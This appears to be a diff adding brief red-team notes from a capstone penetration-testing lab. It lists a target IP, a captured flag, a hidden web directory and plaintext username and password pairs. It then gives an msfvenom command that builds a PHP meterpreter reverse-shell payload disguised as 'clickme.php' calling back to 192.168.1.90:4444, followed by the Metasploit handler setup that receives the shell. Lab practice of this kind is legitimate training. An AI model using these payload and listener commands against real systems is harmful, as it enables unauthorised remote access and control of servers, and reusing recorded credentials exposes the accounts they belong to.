@@ -1,0 +1,13 @@
+Red Team Info 
+
+Capstone IP: 192.168.1.105
+flag 1 b1ng0w@5h1sn@m0
+Hidden Directory: 192.168.1.105/company_folders/secret_folder
+ashton leopoldo 
+ryan linux4u
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 > clickme.php
+use exploit/multi/handler 
+set LHOST 192.168.1.90
+set LPORT 4444
+set payload php/meterpreter/reverse_tcp
+
